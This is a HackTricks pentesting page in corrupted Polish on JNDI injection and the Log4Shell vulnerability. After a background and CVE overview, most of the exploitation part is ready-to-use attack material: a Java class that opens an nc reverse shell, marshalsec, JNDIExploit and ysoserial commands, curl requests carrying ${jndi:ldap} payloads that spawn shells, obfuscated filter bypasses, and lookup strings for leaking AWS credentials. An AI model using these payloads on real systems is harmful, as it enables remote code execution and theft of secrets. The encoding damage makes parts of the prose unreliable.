# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajd藕 najwa偶niejsze podatnoci, aby m贸c je szybko naprawi. Intruder ledzi powierzchni ataku, wykonuje proaktywne skanowanie zagro偶e, znajduje problemy w caym stosie technologicznym, od interfejs贸w API po aplikacje internetowe i systemy chmurowe. [**Wypr贸buj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) ju偶 dzi.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Podstawowe informacje

JNDI, zintegrowane z Jav od koca lat 90., su偶y jako usuga katalogowa, umo偶liwiajc programom Javy odnajdywanie danych lub obiekt贸w za pomoc systemu nazw. Obsuguje r贸偶ne usugi katalogowe za porednictwem interfejs贸w dostawcy usug (SPI), umo偶liwiajc pobieranie danych z r贸偶nych system贸w, w tym zdalnych obiekt贸w Javy. Wsp贸lne SPI to m.in. CORBA COS, Java RMI Registry i LDAP.

### Odwoania nazw JNDI
Obiekty Javy mog by przechowywane i pobierane za pomoc odwoa nazw JNDI, kt贸re wystpuj w dw贸ch formach:

- **Adresy odwoa**: Okrelaj lokalizacj obiektu (np. _rmi://serwer/ref_), umo偶liwiajc bezporednie pobieranie z okrelonego adresu.
- **Zdalna fabryka**: Odwouje si do zdalnej klasy fabrycznej. Po dostpie klasa jest pobierana i instancjonowana z lokalizacji zdalnej.

Jednak ten mechanizm mo偶e by wykorzystany w celu wykonania kodu dowolnego. Jako rodek zaradczy:

- **RMI**: `java.rmi.server.useCodeabseOnly = true` domylnie od JDK 7u21, ograniczajc zdalne adowanie obiekt贸w. Dodatkowo, Menad偶er zabezpiecze ogranicza to, co mo偶e by zaadowane.
- **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` domylnie od JDK 6u141, 7u131, 8u121, blokujc wykonanie zdalnie adowanych obiekt贸w Javy. Jeli ustawione na `true`, mo偶liwe jest zdalne wykonanie kodu bez nadzoru Menad偶era zabezpiecze.
- **CORBA**: Nie ma konkretnej waciwoci, ale Menad偶er zabezpiecze jest zawsze aktywny.

Jednak **Menad偶er nazw**, odpowiedzialny za rozwizywanie odwoa JNDI, nie posiada wbudowanych mechanizm贸w zabezpiecze, co potencjalnie umo偶liwia pobieranie obiekt贸w z dowolnego 藕r贸da. Stanowi to ryzyko, poniewa偶 ochrona RMI, LDAP i CORBA mo偶e zosta obejcia, co prowadzi do adowania dowolnych obiekt贸w Javy lub wykorzystania istniejcych komponent贸w aplikacji (gad偶et贸w) do uruchamiania zoliwego kodu.

Przykady podatnych adres贸w URL to:
- _rmi://serwer-atakujcy/bar_
- _ldap://serwer-atakujcy/bar_
- _iiop://serwer-atakujcy/bar_

Mimo zabezpiecze, pozostaj podatnoci, g贸wnie ze wzgldu na brak zabezpiecze przed adowaniem JNDI z niezaufanych 藕r贸de i mo偶liwo obejcia istniejcych zabezpiecze.


### Przykad JNDI

![](<../../.gitbook/assets/image (655) (1) (1).png>)

Nawet jeli ustawisz **`PROVIDER_URL`**, mo偶esz wskaza inny w wyszukiwaniu i zostanie on u偶yty: `ctx.lookup("<kontrolowany-przez-atakujcego-url>")`, a to jest to, czego atakujcy bdzie u偶ywa do adowania dowolnych obiekt贸w z systemu kontrolowanego przez niego.

### Przegld CORBA

CORBA (Common Object Request Broker Architecture) wykorzystuje **Interoperable Object Reference (IOR)** do jednoznacznego identyfikowania zdalnych obiekt贸w. To odwoanie zawiera istotne informacje, takie jak:

- **ID typu**: Unikalny identyfikator interfejsu.
- **Codebase**: Adres URL do pobrania klasy stub.

Nale偶y zauwa偶y, 偶e CORBA nie jest wrodze podatne. Zapewnienie bezpieczestwa zwykle obejmuje:

- Instalacja **Menad偶era zabezpiecze**.
- Konfiguracja Menad偶era zabezpiecze w celu zezwolenia na poczenia z potencjalnie zoliwymi codebase'ami. Mo偶na to osign poprzez:
- Uprawnienia gniazdka, np. ````permissions java.net.SocketPermission "*:1098-1099", "connect";````.
- Uprawnienia do odczytu plik贸w, uniwersalnie (````permission java.io.FilePermission "<<ALL FILES>>", "read";````) lub dla okrelonych katalog贸w, w kt贸rych mog znajdowa si zoliwe pliki.

Jednak niekt贸re polityki dostawc贸w mog by poba偶liwe i domylnie zezwala na te poczenia.

### Kontekst RMI

W przypadku RMI (Remote Method Invocation) sytuacja jest nieco inna. Podobnie jak w przypadku CORBA, domylnie ograniczone jest pobieranie dowolnych klas. Aby wykorzysta RMI, zazwyczaj trzeba obej Menad偶era zabezpiecze, co jest r贸wnie偶 istotne w przypadku CORBA.

### LDAP

Po pierwsze, musimy rozr贸偶ni midzy wyszukiwaniem a odnajdywaniem.\
**Wyszukiwanie** bdzie u偶ywa adresu URL takiego jak `ldap://localhost:389/o=JNDITutorial`, aby znale藕 obiekt JNDITutorial na serwerze LDAP i **pobra jego atrybuty**.\
**Odnajdywanie** jest przeznaczone dla **usug nazw**, poniewa偶 chcemy **pobra to, co jest powizane z nazw**.

Jeli wyszukiwanie LDAP zostao wywoane z ustawieniem **SearchControls.setReturningObjFlag() na `true`, to zwr贸cony obiekt zostanie odtworzony**.

Dlatego istnieje kilka sposob贸w ataku na te opcje.\
**Atakujcy mo偶e zatru rekordy LDAP, wprowadzajc w nich adunki**, kt贸re zostan wykonane w systemach, kt贸re je gromadz (bardzo przydatne do **skompromitowania dziesitek maszyn**, jeli masz dostp do serwera LDAP). Inny spos贸b na wykorzystanie tego to przeprowadzenie **ataku typu MitM w wyszukiwaniu LDAP** na przykad.

Jeli mo偶esz **spowodowa, 偶e aplikacja rozwi偶e URL JNDI LDAP**, mo偶esz kontrolowa wyszukiwane LDAP i mo偶esz odesa wykorzystanie (log4shell).

#### Wy
## Wra偶liwo Log4Shell

Wra偶liwo ta wystpuje w Log4j, poniewa偶 obsuguje [**specjaln skadni**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) w postaci `${prefix:name}`, gdzie `prefix` to jeden z wielu r贸偶nych [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html), a `name` powinno by oceniane. Na przykad `${java:version}` to aktualna wersja Java.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) wprowadzi funkcj `jndi` Lookup. Ta funkcja umo偶liwia pobieranie zmiennych za pomoc JNDI. Zazwyczaj klucz jest automatycznie poprzedzany prefiksem `java:comp/env/`. Jednak jeli sam klucz zawiera **":"**, ten domylny prefiks nie jest stosowany.

Z obecnoci **":"** w kluczu, jak w `${jndi:ldap://example.com/a}`, nie ma **prefiksu** i **serwer LDAP jest zapytywany o obiekt**. Te Lookups mog by u偶ywane zar贸wno w konfiguracji Log4j, jak i podczas logowania linii.

W zwizku z tym, jedyn rzecz potrzebn do uzyskania RCE jest **wra偶liwa wersja Log4j przetwarzajca informacje kontrolowane przez u偶ytkownika**. Poniewa偶 jest to biblioteka szeroko stosowana przez aplikacje Java do rejestrowania informacji (w tym aplikacje dostpne w Internecie), bardzo czsto log4j rejestrowa na przykad otrzymane nag贸wki HTTP, takie jak User-Agent. Jednak log4j **nie jest u偶ywany tylko do rejestrowania informacji HTTP, ale dowolnego wejcia** i danych wskazanych przez programist.

## Przegld CVE zwizanych z Log4Shell

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **[Krytyczne]**
Ta wra偶liwo to krytyczna **wada niezaufanej deserializacji** w komponencie `log4j-core`, dotyczy wersji od 2.0-beta9 do 2.14.1. Pozwala na **zdalne wykonanie kodu (RCE)**, umo偶liwiajc atakujcym przejcie system贸w. Problem zgosi Chen Zhaojun z zespou Alibaba Cloud Security Team i dotyczy r贸偶nych framework贸w Apache. Pierwotna poprawka w wersji 2.15.0 bya niekompletna. Dostpne s reguy Sigma do obrony ([Regua 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml), [Regua 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **[Krytyczne]**
Pocztkowo oceniana jako niska, ale p贸藕niej podniesiona do krytycznej, ta CVE to wada **Denial of Service (DoS)** wynikajca z niekompletnej poprawki w wersji 2.15.0 dla CVE-2021-44228. Dotyczy niestandardowych konfiguracji, umo偶liwiajc atakujcym przeprowadzanie atak贸w DoS za pomoc spreparowanych payload贸w. [Tweet](https://twitter.com/marcioalm/status/1471740771581652995) przedstawia metod obejcia. Problem zosta rozwizany w wersjach 2.16.0 i 2.12.2 poprzez usunicie wzorc贸w wyszukiwania wiadomoci i domylne wyczenie JNDI.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **[Wysokie]**
Dotyczy wersji **Log4j 1.x** w niestandardowych konfiguracjach, kt贸re u偶ywaj `JMSAppender`. Ta CVE to wada niezaufanej deserializacji. Brak dostpnej poprawki dla gazi 1.x, kt贸ra jest przestarzaa, zaleca si aktualizacj do `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **[Umiarkowane]**
Ta wra偶liwo dotyczy frameworku logowania **Logback**, nastpcy Log4j 1.x. Wczeniej uwa偶ano, 偶e framework jest bezpieczny, ale okazao si, 偶e jest podatny, dlatego wydano nowsze wersje (1.3.0-alpha11 i 1.2.9), aby rozwiza ten problem.

### **CVE-2021-45105** **[Wysokie]**
Log4j 2.16.0 zawiera wad DoS, co skonio do wydania `log4j 2.17.0` w celu naprawienia CVE. Wicej szczeg贸贸w znajduje si w raporcie BleepingComputer [tutaj](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)
Dotyczy log4j w wersji 2.17, ta CVE wymaga, aby atakujcy kontrolowa plik konfiguracyjny log4j. Dotyczy potencjalnego wykonania dowolnego kodu za pomoc skonfigurowanego JDBCAppender. Wicej szczeg贸贸w znajduje si w [wpisie na blogu Checkmarx](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).


## Wykorzystanie Log4Shell

### Odkrywanie

Ta wra偶liwo jest bardzo atwa do odkrycia, jeli nie jest chroniona, poniewa偶 wysya przynajmniej **偶danie DNS** pod adres, kt贸ry podajesz w swoim payloadzie. Dlatego payloady takie jak:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (korzystajc z [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (korzystajc z [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (korzystajc z Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (korzystajc z [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (korzystajc z [huntress](https://log4shell.huntress.com))

Nale偶y zauwa偶y, 偶e **nawet jeli otrzymamy 偶danie DNS, nie oznacza to, 偶e aplikacja jest podatna** (ani nawet wra偶liwa), trzeba bdzie spr贸bowa j wykorzysta.

{% hint style="info" %}
Pamitaj, 偶eby **wykorzysta wersj 2.15**, musisz doda **ominicie sprawdzania lokalnego hosta**: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Odkrywanie lokalne**

Wyszukaj **lokalne wra偶liwe wersje** biblioteki za pomoc:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Weryfikacja**

Niekt贸re z wymienionych wczeniej platform umo偶liwiaj wstawienie pewnych zmiennych danych, kt贸re zostan zalogowane podczas ich 偶dania.\
Mo偶e to by bardzo przydatne w dw贸ch przypadkach:

* Do **weryfikacji** podatnoci
* Do **wycieku informacji** poprzez wykorzystanie podatnoci

Na przykad, mo偶esz poprosi o co takiego:\
lub takie `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** i jeli **otrzymasz 偶danie DNS z wartoci zmiennej rodowiskowej**, to oznacza, 偶e aplikacja jest podatna.

Inne informacje, kt贸re mo偶esz spr贸bowa **wyciec**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### Informacje dotyczce RCE

{% hint style="info" %}
Hosty dziaajce na wersjach JDK powy偶ej 6u141, 7u131 lub 8u121 s chronione przed atakiem polegajcym na adowaniu klasy LDAP. Wynika to z domylnego wyczenia `com.sun.jndi.ldap.object.trustURLCodebase`, co uniemo偶liwia JNDI adowanie zdalnej lokalizacji kodu za pomoc LDAP. Jednak wa偶ne jest zauwa偶enie, 偶e te wersje **nie s chronione przed atakiem deserializacji**.

Dla atakujcych majcych na celu wykorzystanie tych wy偶szych wersji JDK, konieczne jest wykorzystanie **zaufanego gad偶etu** w aplikacji Java. Narzdzia takie jak ysoserial lub JNDIExploit s czsto u偶ywane w tym celu. W przeciwiestwie do tego, wykorzystanie ni偶szych wersji JDK jest stosunkowo atwiejsze, poniewa偶 mo偶na manipulowa tymi wersjami w celu adowania i wykonania dowolnych klas.

Aby uzyska **wicej informacji** (_takich jak ograniczenia wektor贸w RMI i CORBA_), **sprawd藕 poprzedni sekcj JNDI Naming Reference** lub [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec z niestandardowym payloadem

Mo偶esz to przetestowa na **THM box:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

U偶yj narzdzia [**marshalsec**](https://github.com/mbechler/marshalsec) (wersja jar dostpna [**tutaj**](https://github.com/RandomRobbieBF/marshalsec-jar)). Ten podejcie ustanawia serwer przekierowa LDAP, kt贸ry przekierowuje poczenia do drugiego serwera HTTP, na kt贸rym bdzie hostowany exploit:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Aby spowodowa, 偶e cel zaaduje kod odwr贸conej powoki, stw贸rz plik Java o nazwie `Exploit.java` o poni偶szej zawartoci:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Skompiluj plik Java do pliku klasy u偶ywajc: `javac Exploit.java -source 8 -target 8`. Nastpnie uruchom **serwer HTTP** w katalogu zawierajcym plik klasy za pomoc polecenia: `python3 -m http.server`. Upewnij si, 偶e **serwer LDAP marshalsec** odwouje si do tego serwera HTTP.

Wywoaj wykonanie klasy exploit na podatnym serwerze internetowym, wysyajc adunek przypominajcy:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Uwaga:** Ten exploit opiera si na konfiguracji Javy, kt贸ra umo偶liwia zdalne adowanie kodu za porednictwem LDAP. Jeli to nie jest dozwolone, rozwa偶 wykorzystanie zaufanej klasy do wykonania dowolnego kodu.

### RCE - **JNDIExploit**

{% hint style="info" %}
Nale偶y zauwa偶y, 偶e z jakiego powodu autor usun ten projekt z github po odkryciu log4shell. Mo偶na znale藕 zarchiwizowan wersj pod adresem [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2), ale jeli chcesz uszanowa decyzj autora, skorzystaj z innej metody do wykorzystania tej luki.

Ponadto, nie mo偶na znale藕 kodu 藕r贸dowego w maszynie Wayback, wic albo przeanalizuj kod 藕r贸dowy, albo wykonaj plik jar, wiedzc, 偶e nie wiesz, co wykonujesz.
{% endhint %}

W tym przykadzie mo偶esz po prostu uruchomi **podatny serwer sieciowy dla log4shell** na porcie 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_w pliku README znajdziesz informacje, jak go uruchomi_). Ta podatna aplikacja rejestruje zawarto nag贸wka 偶dania HTTP _X-Api-Version_ za pomoc podatnej wersji log4shell.

Nastpnie mo偶esz pobra plik jar **JNDIExploit** i uruchomi go za pomoc polecenia:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Po przeczytaniu kodu przez kilka minut, w klasach _com.feihong.ldap.LdapServer_ i _com.feihong.ldap.HTTPServer_ mo偶na zobaczy, jak tworzone s **serwery LDAP i HTTP**. Serwer LDAP bdzie rozumia, jakie dane musz by udostpnione i przekieruje ofiar do serwera HTTP, kt贸ry dostarczy exploit.\
W klasach _com.feihong.ldap.gadgets_ znajduj si **konkretne narzdzia**, kt贸re mog by u偶yte do wykonania po偶danej akcji (potencjalnie wykonanie dowolnego kodu). Natomiast w klasach _com.feihong.ldap.template_ mo偶na zobaczy r贸偶ne klasy szablon贸w, kt贸re **generuj exploity**.

Wszystkie dostpne exploity mo偶na zobaczy za pomoc polecenia **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Kilka przydatnych to:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Wic, w naszym przykadzie, ju偶 mamy uruchomion podatn aplikacj Docker. Aby j zaatakowa:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Podczas wysyania atak贸w zobaczysz pewne wyniki w terminalu, w kt贸rym uruchomie **JNDIExploit-1.2-SNAPSHOT.jar**.

**Pamitaj, aby sprawdzi `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` w celu uzyskania innych opcji eksploatacji. Ponadto, w razie potrzeby, mo偶esz zmieni porty serwer贸w LDAP i HTTP.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

Podobnie jak w poprzednim ataku, mo偶esz spr贸bowa u偶y [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) do wykorzystania tej podatnoci.\
Mo偶esz wygenerowa adresy URL do wysania ofierze, uruchamiajc:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Ten atak przy u偶yciu niestandardowo wygenerowanego obiektu Java bdzie dziaa w laboratoriach, takich jak **THM solar room**. Jednak og贸lnie rzecz biorc, nie bdzie dziaa (poniewa偶 domylnie Java nie jest skonfigurowana do adowania zdalnego kodu przy u偶yciu LDAP), poniewa偶 nie wykorzystuje zaufanej klasy do wykonania dowolnego kodu._

### RCE - ysoserial & JNDI-Exploit-Kit

Ta opcja jest naprawd przydatna do atakowania **wersji Javy skonfigurowanych do zaufania tylko okrelonym klasom, a nie wszystkim**. Dlatego **ysoserial** zostanie u偶yty do wygenerowania **serializacji zaufanych klas**, kt贸re mog by u偶ywane jako gad偶ety do **wykonywania dowolnego kodu** (_zaufana klasa wykorzystywana przez ysoserial musi by u偶ywana przez program Java ofiary, aby atak zadziaa_).

Za pomoc **ysoserial** lub [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) mo偶na stworzy exploit deserializacji, kt贸ry zostanie pobrany przez JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
U偶yj [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit), aby wygenerowa **linki JNDI**, gdzie exploit bdzie oczekiwa na poczenia z podatnych maszyn. Mo偶esz serwowa **r贸偶ne exploity, kt贸re mog by automatycznie generowane** przez JNDI-Exploit-Kit lub nawet **wasne adunki deserializacji** (wygenerowane przez Ciebie lub ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

Teraz mo偶esz atwo u偶y wygenerowanego linku JNDI do wykorzystania podatnoci i uzyskania **odwr贸conej powoki** wysyajc go do podatnej wersji log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Ominicia
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:谋}}:ldap://...} //Notice the unicode "i"
```
### Automatyczne skanery

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Znajd藕 lokalne podatne biblioteki

### Laboratoria do testowania

* [**Maszyna LogForge HTB**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar room**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Eksploatacja po Log4Shell

W tym [**opisie CTF**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) dobrze wyjaniono, jak potencjalnie **mo偶na wykorzysta** niekt贸re funkcje **Log4J**.

[**Strona zabezpiecze**](https://logging.apache.org/log4j/2.x/security.html) Log4j zawiera kilka interesujcych zda:

> Od wersji 2.16.0 (dla Java 8) **funkcja wyszukiwania komunikat贸w zostaa cakowicie usunita**. **Wyszukiwanie w konfiguracji nadal dziaa**. Ponadto, Log4j domylnie wycza dostp do JNDI. Wyszukiwanie JNDI w konfiguracji musi by teraz wczone explicite.

> Od wersji 2.17.0 (oraz 2.12.3 i 2.3.1 dla Java 7 i Java 6), **tylko cigi wyszukiwania w konfiguracji s rozwijane rekurencyjnie**; w ka偶dym innym u偶yciu, tylko najwy偶sze wyszukiwanie jest rozwizane, a wszelkie zagnie偶d偶one wyszukiwania nie s rozwizywane.

Oznacza to, 偶e domylnie nie mo偶na **u偶ywa 偶adnego ataku `jndi`**. Ponadto, aby wykona **rekurencyjne wyszukiwanie**, musisz je skonfigurowa.

Na przykad, w tym CTF byo to skonfigurowane w pliku log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Wyszukiwanie rodowiska

W [tym CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) atakujcy kontrolowa warto `${sys:cmd}` i musia wydoby flag z zmiennej rodowiskowej.\
Jak wida na tej stronie w [**poprzednich payloadach**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), istnieje kilka sposob贸w na dostp do zmiennych rodowiskowych, takich jak: **`${env:FLAG}`**. W tym CTF byo to bezu偶yteczne, ale w innych scenariuszach 偶ycia codziennego mo偶e si to przyda.

### Wyciek w wyjtkach

W CTF-ie **nie mo偶na byo uzyska dostpu do stderr** aplikacji Java za pomoc log4J, ale wyjtki Log4J **s wysyane do stdout**, kt贸ry by drukowany w aplikacji Python. Oznaczao to, 偶e wywoujc wyjtek moglimy uzyska dostp do zawartoci. Wyjtek do wydobycia flagi to: **`${java:${env:FLAG}}`.** Dziaa to dlatego, 偶e **`${java:CTF{blahblah}}`** nie istnieje, a wyjtek z wartoci flagi zostanie pokazany:

![](<../../.gitbook/assets/image (157).png>)

### Wyjtki wzorc贸w konwersji

Warto wspomnie, 偶e mo偶na r贸wnie偶 wstrzykn nowe [**wzorce konwersji**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) i wywoywa wyjtki, kt贸re zostan zalogowane do `stdout`. Na przykad:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

Nie okazao si to przydatne do wydobycia daty z wiadomoci o bdzie, poniewa偶 wyszukiwanie nie zostao rozwizane przed wzorcem konwersji, ale mo偶e by przydatne do innych rzeczy, takich jak wykrywanie.

### Wyra偶enia regularne wzorc贸w konwersji

Jednak mo偶liwe jest u偶ycie niekt贸rych **wzorc贸w konwersji obsugujcych wyra偶enia regularne** do wydobycia informacji z wyszukiwania za pomoc wyra偶e regularnych i wykorzystania zachowa **wyszukiwania binarnego** lub **opartych na czasie**.

* **Wyszukiwanie binarne za pomoc wiadomoci wyjtk贸w**

Wzorzec konwersji **`%replace`** mo偶e by u偶ywany do **zamiany** **treci** w **acuchu znak贸w**, nawet za pomoc **wyra偶e regularnych**. Dziaa to w ten spos贸b: `replace{pattern}{regex}{substitution}`\
Wykorzystujc to zachowanie, mo偶na spowodowa, 偶e **zamiana wywoa wyjtek, jeli wyra偶enie regularne dopasuje** cokolwiek wewntrz acucha znak贸w (i nie bdzie wyjtku, jeli nie zostanie znalezione), na przykad:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
